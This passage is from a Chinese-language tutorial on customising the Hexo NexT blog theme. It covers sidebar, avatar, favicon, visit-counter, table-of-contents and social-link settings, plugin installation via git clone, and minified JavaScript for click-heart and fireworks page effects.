<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--more--&gt;</span></span><br></pre></td></tr></table></figure>
<p>在它后面的内容会被隐藏，当点击阅读全文就能看到了</p>
<h3 id="底部标签图标样式"><a href="#底部标签图标样式" class="headerlink" title="底部标签图标样式"></a>底部标签图标样式</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/layout/_macro/post.swig</span><br></pre></td></tr></table></figure>
<p>将<code>rel=&quot;tag&quot;&gt;&#123;&#123; tag_indicate &#125;&#125;</code>改为：<code>rel=&quot;tag&quot;&gt;&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;</code></p>
<h3 id="头像配置"><a href="#头像配置" class="headerlink" title="头像配置"></a>头像配置</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Sidebar Avatar</span></span><br><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">url:</span> <span class="string">/images/me.png</span>	<span class="comment">#头像路径，在主题目录下的source下</span></span><br><span class="line">  <span class="comment"># If true, the avatar would be dispalyed in circle.</span></span><br><span class="line">  <span class="attr">rounded:</span> <span class="literal">true</span>	<span class="comment">#头像是否为圆形显示</span></span><br><span class="line">  <span class="comment"># If true, the avatar would be rotated with the cursor.</span></span><br><span class="line">  <span class="attr">rotated:</span> <span class="literal">true</span>	<span class="comment">#鼠标到头像上是否旋转头像</span></span><br></pre></td></tr></table></figure>
<h3 id="侧栏配置"><a href="#侧栏配置" class="headerlink" title="侧栏配置"></a>侧栏配置</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">sidebar:</span></span><br><span class="line">  <span class="comment"># Sidebar Position, available values: left | right (only for Pisces | Gemini).</span></span><br><span class="line">  <span class="comment">#边栏位置（只作用于 Pisces 和 Gemini 样式）</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">left</span>	<span class="comment">#左边</span></span><br><span class="line">  <span class="comment">#position: right	#右边</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Manual define the sidebar width. If commented, will be default for:</span></span><br><span class="line">  <span class="comment"># Muse | Mist: 320</span></span><br><span class="line">  <span class="comment"># Pisces | Gemini: 240</span></span><br><span class="line">  <span class="comment">#width: 300	#侧栏宽度，注释就用默认值</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Sidebar Display, available values (only for Muse | Mist):</span></span><br><span class="line">  <span class="comment">#  - post    expand on posts automatically. Default.</span></span><br><span class="line">  				<span class="comment">#在文章页面（拥有目录列表）时显示</span></span><br><span class="line">  <span class="comment">#  - always  expand for all pages automatically.</span></span><br><span class="line">  				<span class="comment">#在所有页面中都显示</span></span><br><span class="line">  <span class="comment">#  - hide    expand only when click on the sidebar toggle icon.</span></span><br><span class="line">  				<span class="comment">#在所有页面中都隐藏（可以手动展开）</span></span><br><span class="line">  <span class="comment">#  - remove  totally remove sidebar including sidebar toggle.</span></span><br><span class="line">  				<span class="comment">#完全移除</span></span><br><span class="line">  <span class="attr">display:</span> <span class="string">post</span>	<span class="comment">#侧栏显示时机（只作用于 Pisces 和 Gemini 样式）</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  <span class="attr">offset:</span> <span class="number">12</span>	<span class="comment">#文章间距（只作用于 Pisces 和 Gemini 样式）</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">onmobile:</span> <span class="literal">false</span>	<span class="comment">#在窄视图上启用侧栏（只作用于 Muse 和 Mist 样式）</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">dimmer:</span> <span class="literal">false</span>		<span class="comment">#单击任何页面的空白部分关闭栏（只作用于 Muse 和 Mist 样式）</span></span><br><span class="line"></span><br><span class="line"><span class="attr">back2top:</span>	<span class="comment">#返回顶部</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Back to top in sidebar.</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="literal">true</span>	<span class="comment">#将回到顶部按钮放到侧边栏</span></span><br><span class="line">  <span class="comment"># Scroll percent label in b2t button.</span></span><br><span class="line">  <span class="attr">scrollpercent:</span> <span class="literal">true</span>	<span class="comment">#在回到顶部按钮上显示百分百</span></span><br></pre></td></tr></table></figure>
<h3 id="博客网站图标"><a href="#博客网站图标" class="headerlink" title="博客网站图标"></a>博客网站图标</h3><p>将png、jpg格式的图标放到<code>themes/next/source/images</code>下</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">favicon:</span></span><br><span class="line">  <span class="attr">small:</span> <span class="string">/images/logo-16px.png</span></span><br><span class="line">  <span class="attr">medium:</span> <span class="string">/images/logo-32px.png</span></span><br><span class="line">  <span class="attr">apple_touch_icon:</span> <span class="string">/images/logo-32px.png</span></span><br><span class="line">  <span class="attr">safari_pinned_tab:</span> <span class="string">/images/logo.png</span></span><br><span class="line">  <span class="comment">#android_manifest: /images/manifest.json</span></span><br><span class="line">  <span class="comment">#ms_browserconfig: /images/browserconfig.xml</span></span><br></pre></td></tr></table></figure>
<h3 id="访问计数"><a href="#访问计数" class="headerlink" title="访问计数"></a>访问计数</h3><p>用的是<a href="http://busuanzi.ibruce.info/">不蒜子脚本</a>来达到计数目的的</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Show Views / Visitors of the website / page with busuanzi.</span></span><br><span class="line"><span class="comment"># Get more information on http://ibruce.info/2015/04/04/busuanzi</span></span><br><span class="line"><span class="attr">busuanzi_count:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>		<span class="comment">#开启不蒜子计数</span></span><br><span class="line">  <span class="attr">total_visitors:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_visitors_icon:</span> <span class="string">user</span></span><br><span class="line">  <span class="attr">total_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_views_icon:</span> <span class="string">eye</span></span><br><span class="line">  <span class="attr">post_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">post_views_icon:</span> <span class="string">eye</span></span><br></pre></td></tr></table></figure>
<p>若显示出错可到不蒜子官网查询到<a href="http://ibruce.info/2015/04/04/busuanzi">最新脚本变化</a><br>在本地查看的变量是错误, <code>hexo c</code> ,<code>hexo d</code>之后打开网页,就能看到正确的访问人数</p>
<h3 id="侧边栏目录"><a href="#侧边栏目录" class="headerlink" title="侧边栏目录"></a>侧边栏目录</h3><p>在写文章是通常会有给标题编号的情况，但主题默认也会给加上一个编号，这样就会有些多余，关闭自动编号只需在侧边栏目录配置关闭即可</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Table Of Contents in the Sidebar	#边栏中的目录</span></span><br><span class="line"><span class="attr">toc:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">	</span><br><span class="line">  <span class="attr">number:</span> <span class="literal">true</span>	<span class="comment">#自动将列表编号添加到toc	修改为false就不会自动标号了</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">wrap:</span> <span class="literal">false</span>	<span class="comment">#如果为true，如果标题宽度大于侧边栏宽度，则所有单词将放在下一行。</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">expand_all:</span> <span class="literal">false</span>	<span class="comment">#如果为true，将显示帖子中的所有TOC级别，而不是其中的已激活部分</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">max_depth:</span> <span class="number">6</span>	<span class="comment">#生成的toc的最大航向深度。可以通过Front-matter中的`toc_max_depth`在一个帖子中设置它</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="侧边栏社交链接"><a href="#侧边栏社交链接" class="headerlink" title="侧边栏社交链接"></a>侧边栏社交链接</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="attr">GitHub:</span> <span class="string">https://github.com/eonun</span> <span class="string">||</span> <span class="string">github</span></span><br><span class="line">  <span class="attr">E-Mail:</span> <span class="string">mailto:eonun@vip.qq.com</span> <span class="string">||</span> <span class="string">envelope</span></span><br><span class="line">  <span class="attr">Weibo:</span> <span class="string">https://weibo.com/eonun</span> <span class="string">||</span> <span class="string">weibo</span></span><br><span class="line">  <span class="comment">#Google: https://plus.google.com/yourname || google</span></span><br><span class="line">  <span class="attr">Twitter:</span> <span class="string">https://twitter.com/eonun</span> <span class="string">||</span> <span class="string">twitter</span></span><br><span class="line">  <span class="comment">#FB Page: https://www.facebook.com/yourname || facebook</span></span><br><span class="line">  <span class="comment">#VK Group: https://vk.com/yourname || vk</span></span><br><span class="line">  <span class="comment">#StackOverflow: https://stackoverflow.com/yourname || stack-overflow</span></span><br><span class="line">  <span class="comment">#YouTube: https://youtube.com/yourname || youtube</span></span><br><span class="line">  <span class="comment">#Instagram: https://instagram.com/yourname || instagram</span></span><br><span class="line">  <span class="comment">#Skype: skype:yourname?call|chat || skype</span></span><br></pre></td></tr></table></figure>
<p><strong>github角落及丝带</strong></p>
<p>在<a href="http://tholman.com/github-corners/">GitHub Corners（角落）</a>或<a href="https://github.blog/2008-12-19-github-ribbons/">GitHub Ribbons（丝带）</a>选择一款你喜欢的挂饰，拷贝方框内的代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/layout/_layout.swig		<span class="comment">#将代码加入&lt;div class=&quot;headband&quot;&gt;&lt;/div&gt;下方</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改自己的github链接（https://github.com/eonun）</span></span><br></pre></td></tr></table></figure>
<h3 id="侧边栏友情链接"><a href="#侧边栏友情链接" class="headerlink" title="侧边栏友情链接"></a>侧边栏友情链接</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Blog rolls</span></span><br><span class="line"><span class="attr">links_icon:</span> <span class="string">link</span></span><br><span class="line"><span class="attr">links_title:</span> <span class="string">友链</span></span><br><span class="line"><span class="attr">links_layout:</span> <span class="string">block</span></span><br><span class="line"><span class="comment">#links_layout: inline</span></span><br><span class="line"><span class="attr">links:</span></span><br><span class="line">  <span class="string">Web前端导航:</span> <span class="string">http://www.alloyteam.com/nav/</span></span><br><span class="line">  <span class="string">创造狮导航:</span> <span class="string">http://www.chuangzaoshi.com/code</span></span><br><span class="line">  <span class="string">前端书籍资料:</span> <span class="string">http://www.36zhen.com/t?id=3448</span></span><br></pre></td></tr></table></figure>
<h3 id="文章版权信息"><a href="#文章版权信息" class="headerlink" title="文章版权信息"></a>文章版权信息</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">creative_commons:</span></span><br><span class="line">  <span class="attr">license:</span> <span class="string">by-nc-sa</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">post:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">language:</span></span><br></pre></td></tr></table></figure>
<h3 id="动画"><a href="#动画" class="headerlink" title="动画"></a>动画</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Use velocity to animate everything.</span></span><br><span class="line"><span class="attr">motion:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>	<span class="comment">#开启动画</span></span><br><span class="line">  <span class="attr">async:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p><strong>背景动画</strong></p>
<p>根据自己需要开启即可</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Canvas-nest</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/theme-next/theme-next-canvas-nest</span></span><br><span class="line"><span class="attr">canvas_nest:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">onmobile:</span> <span class="literal">true</span> <span class="comment"># 在手机上显示或不显示</span></span><br><span class="line">  <span class="attr">color:</span> <span class="string">&quot;0,191,255&quot;</span> <span class="comment"># RGB值，使用&#x27;，&#x27;分隔</span></span><br><span class="line">  <span class="attr">opacity:</span> <span class="number">0.8</span> <span class="comment"># 线的不透明度：0~1</span></span><br><span class="line">  <span class="attr">zIndex:</span> <span class="number">-1</span> <span class="comment"># 背景的z-index属性</span></span><br><span class="line">  <span class="attr">count:</span> <span class="number">666</span> <span class="comment"># 行数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># JavaScript 3D library.</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/theme-next/theme-next-three</span></span><br><span class="line"><span class="comment"># three_waves	三波</span></span><br><span class="line"><span class="attr">three_waves:</span> <span class="literal">false</span></span><br><span class="line"><span class="comment"># canvas_lines	帆布线</span></span><br><span class="line"><span class="attr">canvas_lines:</span> <span class="literal">false</span></span><br><span class="line"><span class="comment"># canvas_sphere 帆布球体</span></span><br><span class="line"><span class="attr">canvas_sphere:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Canvas-ribbon</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/theme-next/theme-next-canvas-ribbon</span></span><br><span class="line"><span class="attr">canvas_ribbon:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">size:</span> <span class="number">300</span>		<span class="comment">#色带的宽度</span></span><br><span class="line">  <span class="attr">alpha:</span> <span class="number">0.6</span>	<span class="comment">#功能区的透明度</span></span><br><span class="line">  <span class="attr">zIndex:</span> <span class="number">-1</span>	<span class="comment">#功能区的显示级别</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#要使用的动画需下载相关插件才能使用，不用就无需下载了</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/theme-next-canvas-nest themes/next/<span class="built_in">source</span>/lib/canvas-nest</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/theme-next-three themes/next/<span class="built_in">source</span>/lib/three</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/theme-next-canvas-ribbon themes/next/<span class="built_in">source</span>/lib/canvas-ribbon</span><br></pre></td></tr></table></figure>
<h3 id="鼠标点击特效"><a href="#鼠标点击特效" class="headerlink" title="鼠标点击特效"></a>鼠标点击特效</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/<span class="built_in">source</span>/js/clicklove.js	<span class="comment">#新建文件，并添加代码</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">!<span class="function"><span class="keyword">function</span>(<span class="params">e,t,a</span>)</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span>&#123;c(<span class="string">&quot;.heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: &#x27;&#x27;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;&quot;</span>),o(),r()&#125;<span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> e=<span class="number">0</span>;e&lt;d.length;e++)d[e].alpha&lt;=<span class="number">0</span>?(t.body.removeChild(d[e].el),d.splice(e,<span class="number">1</span>)):(d[e].y--,d[e].scale+=<span class="number">.004</span>,d[e].alpha-=<span class="number">.013</span>,d[e].el.style.cssText=<span class="string">&quot;left:&quot;</span>+d[e].x+<span class="string">&quot;px;top:&quot;</span>+d[e].y+<span class="string">&quot;px;opacity:&quot;</span>+d[e].alpha+<span class="string">&quot;;transform:scale(&quot;</span>+d[e].scale+<span class="string">&quot;,&quot;</span>+d[e].scale+<span class="string">&quot;) rotate(45deg);background:&quot;</span>+d[e].color+<span class="string">&quot;;z-index:99999&quot;</span>);requestAnimationFrame(r)&#125;<span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> t=<span class="string">&quot;function&quot;</span>==<span class="keyword">typeof</span> e.onclick&amp;&amp;e.onclick;e.onclick=<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;t&amp;&amp;t(),i(e)&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> a=t.createElement(<span class="string">&quot;div&quot;</span>);a.className=<span class="string">&quot;heart&quot;</span>,d.push(&#123;<span class="attr">el</span>:a,<span class="attr">x</span>:e.clientX-<span class="number">5</span>,<span class="attr">y</span>:e.clientY-<span class="number">5</span>,<span class="attr">scale</span>:<span class="number">1</span>,<span class="attr">alpha</span>:<span class="number">1</span>,<span class="attr">color</span>:s()&#125;),t.body.appendChild(a)&#125;<span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> a=t.createElement(<span class="string">&quot;style&quot;</span>);a.type=<span class="string">&quot;text/css&quot;</span>;<span class="keyword">try</span>&#123;a.appendChild(t.createTextNode(e))&#125;<span class="keyword">catch</span>(t)&#123;a.styleSheet.cssText=e&#125;t.getElementsByTagName(<span class="string">&quot;head&quot;</span>)[<span class="number">0</span>].appendChild(a)&#125;<span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">&quot;rgb(&quot;</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">&quot;,&quot;</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">&quot;,&quot;</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">&quot;)&quot;</span>&#125;<span class="keyword">var</span> d=[];e.requestAnimationFrame=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="built_in">setTimeout</span>(e,<span class="number">1e3</span>/<span class="number">60</span>)&#125;&#125;(),n()&#125;(<span class="built_in">window</span>,<span class="built_in">document</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/laout/_layout.swig		<span class="comment">#添加</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- 页面点击小红心 --&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;&#x2F;js&#x2F;clicklove.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>另一种特效</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/<span class="built_in">source</span>/js/fireworks.js	<span class="comment">#新建文件，并添加代码</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">updateCoords</span>(<span class="params">e</span>)</span>&#123;pointerX=(e.clientX||e.touches[<span class="number">0</span>].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[<span class="number">0</span>].clientY-canvasEl.getBoundingClientRect().top&#125;<span class="function"><span class="keyword">function</span> <span class="title">setParticuleDirection</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> t=anime.random(<span class="number">0</span>,<span class="number">360</span>)*<span class="built_in">Math</span>.PI/<span class="number">180</span>,a=anime.random(<span class="number">50</span>,<span class="number">180</span>),n=[-<span class="number">1</span>,<span class="number">1</span>][anime.random(<span class="number">0</span>,<span class="number">1</span>)]*a;<span class="keyword">return</span>&#123;<span class="attr">x</span>:e.x+n*<span class="built_in">Math</span>.cos(t),<span class="attr">y</span>:e.y+n*<span class="built_in">Math</span>.sin(t)&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">createParticule</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a=&#123;&#125;;<span class="keyword">return</span> a.x=e,a.y=t,a.color=colors[anime.random(<span class="number">0</span>,colors.length-<span class="number">1</span>)],a.radius=anime.random(<span class="number">16</span>,<span class="number">32</span>),a.endPos=setParticuleDirection(a),a.draw=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="number">0</span>,<span class="number">2</span>*<span class="built_in">Math</span>.PI,!<span class="number">0</span>),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;<span class="function"><span class="keyword">function</span> <span class="title">createCircle</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a=&#123;&#125;;<span class="keyword">return</span> a.x=e,a.y=t,a.color=<span class="string">&quot;#F00&quot;</span>,a.radius=<span class="number">0.1</span>,a.alpha=<span class="number">0.5</span>,a.lineWidth=<span class="number">6</span>,a.draw=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="number">0</span>,<span class="number">2</span>*<span class="built_in">Math</span>.PI,!<span class="number">0</span>),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=<span class="number">1</span>&#125;,a&#125;<span class="function"><span class="keyword">function</span> <span class="title">renderParticule</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> t=<span class="number">0</span>;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">animateParticules</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> a=createCircle(e,t),n=[],i=<span class="number">0</span>;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;<span class="attr">targets</span>:n,<span class="attr">x</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> e.endPos.x&#125;,<span class="attr">y</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> e.endPos.y&#125;,<span class="attr">radius</span>:<span class="number">0.1</span>,<span class="attr">duration</span>:anime.random(<span class="number">1200</span>,<span class="number">1800</span>),<span class="attr">easing</span>:<span class="string">&quot;easeOutExpo&quot;</span>,<span class="attr">update</span>:renderParticule&#125;).add(&#123;<span class="attr">targets</span>:a,<span class="attr">radius</span>:anime.random(<span class="number">80</span>,<span class="number">160</span>),<span class="attr">lineWidth</span>:<span class="number">0</span>,<span class="attr">alpha</span>:&#123;<span class="attr">value</span>:<span class="number">0</span>,<span class="attr">easing</span>:<span class="string">&quot;linear&quot;</span>,<span class="attr">duration</span>:anime.random(<span class="number">600</span>,<span class="number">800</span>)&#125;,<span class="attr">duration</span>:anime.random(<span class="number">1200</span>,<span class="number">1800</span>),<span class="attr">easing</span>:<span class="string">&quot;easeOutExpo&quot;</span>,<span class="attr">update</span>:renderParticule,<span class="attr">offset</span>:<span class="number">0</span>&#125;)&#125;<span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a;<span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> n=<span class="built_in">this</span>,i=<span class="built_in">arguments</span>;<span class="built_in">clearTimeout</span>(a),a=<span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;e.apply(n,i)&#125;,t)&#125;&#125;<span class="keyword">var</span> canvasEl=<span class="built_in">document</span>.querySelector(<span class="string">&quot;.fireworks&quot;</span>);<span class="keyword">if</span>(canvasEl)&#123;<span class="keyword">var</span> ctx=canvasEl.getContext(<span class="string">&quot;2d&quot;</span>),numberOfParticules=<span class="number">30</span>,pointerX=<span class="number">0</span>,pointerY=<span class="number">0</span>,tap=<span class="string">&quot;mousedown&quot;</span>,colors=[<span class="string">&quot;#FF1461&quot;</span>,<span class="string">&quot;#18FF92&quot;</span>,<span class="string">&quot;#5A87FF&quot;</span>,<span class="string">&quot;#FBF38C&quot;</span>],setCanvasSize=debounce(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;canvasEl.width=<span class="number">2</span>*<span class="built_in">window</span>.innerWidth,canvasEl.height=<span class="number">2</span>*<span class="built_in">window</span>.innerHeight,canvasEl.style.width=<span class="built_in">window</span>.innerWidth+<span class="string">&quot;px&quot;</span>,canvasEl.style.height=<span class="built_in">window</span>.innerHeight+<span class="string">&quot;px&quot;</span>,canvasEl.getContext(<span class="string">&quot;2d&quot;</span>).scale(<span class="number">2</span>,<span class="number">2</span>)&#125;,<span class="number">500</span>),render=anime(&#123;<span class="attr">duration</span>:<span class="number">1</span>/<span class="number">0</span>,<span class="attr">update</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.clearRect(<span class="number">0</span>,<span class="number">0</span>,canvasEl.width,canvasEl.height)&#125;&#125;);<span class="built_in">document</span>.addEventListener(tap,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="string">&quot;sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="string">&quot;toggle-sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="string">&quot;A&quot;</span>!==e.target.nodeName&amp;&amp;<span class="string">&quot;IMG&quot;</span>!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!<span class="number">1</span>),setCanvasSize(),<span class="built_in">window</span>.addEventListener(<span class="string">&quot;resize&quot;</span>,setCanvasSize,!<span class="number">1</span>)&#125;<span class="string">&quot;use strict&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">updateCoords</span>(<span class="params">e</span>)</span>&#123;pointerX=(e.clientX||e.touches[<span class="number">0</span>].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[<span class="number">0</span>].clientY-canvasEl.getBoundingClientRect().top&#125;<span class="function"><span class="keyword">function</span> <span class="title">setParticuleDirection</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> t=anime.random(<span class="number">0</span>,<span class="number">360</span>)*<span class="built_in">Math</span>.PI/<span class="number">180</span>,a=anime.random(<span class="number">50</span>,<span class="number">180</span>),n=[-<span class="number">1</span>,<span class="number">1</span>][anime.random(<span class="number">0</span>,<span class="number">1</span>)]*a;<span class="keyword">return</span>&#123;<span class="attr">x</span>:e.x+n*<span class="built_in">Math</span>.cos(t),<span class="attr">y</span>:e.y+n*<span class="built_in">Math</span>.sin(t)&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">createParticule</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a=&#123;&#125;;<span class="keyword">return</span> a.x=e,a.y=t,a.color=colors[anime.random(<span class="number">0</span>,colors.length-<span class="number">1</span>)],a.radius=anime.random(<span class="number">16</span>,<span class="number">32</span>),a.endPos=setParticuleDirection(a),a.draw=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="number">0</span>,<span class="number">2</span>*<span class="built_in">Math</span>.PI,!<span class="number">0</span>),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;<span class="function"><span class="keyword">function</span> <span class="title">createCircle</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a=&#123;&#125;;<span class="keyword">return</span> a.x=e,a.y=t,a.color=<span class="string">&quot;#F00&quot;</span>,a.radius=<span class="number">0.1</span>,a.alpha=<span class="number">0.5</span>,a.lineWidth=<span class="number">6</span>,a.draw=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="number">0</span>,<span class="number">2</span>*<span class="built_in">Math</span>.PI,!<span class="number">0</span>),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=<span class="number">1</span>&#125;,a&#125;<span class="function"><span class="keyword">function</span> <span class="title">renderParticule</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> t=<span class="number">0</span>;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">animateParticules</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> a=createCircle(e,t),n=[],i=<span class="number">0</span>;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;<span class="attr">targets</span>:n,<span class="attr">x</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> e.endPos.x&#125;,<span class="attr">y</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> e.endPos.y&#125;,<span class="attr">radius</span>:<span class="number">0.1</span>,<span class="attr">duration</span>:anime.random(<span class="number">1200</span>,<span class="number">1800</span>),<span class="attr">easing</span>:<span class="string">&quot;easeOutExpo&quot;</span>,<span class="attr">update</span>:renderParticule&#125;).add(&#123;<span class="attr">targets</span>:a,<span class="attr">radius</span>:anime.random(<span class="number">80</span>,<span class="number">160</span>),<span 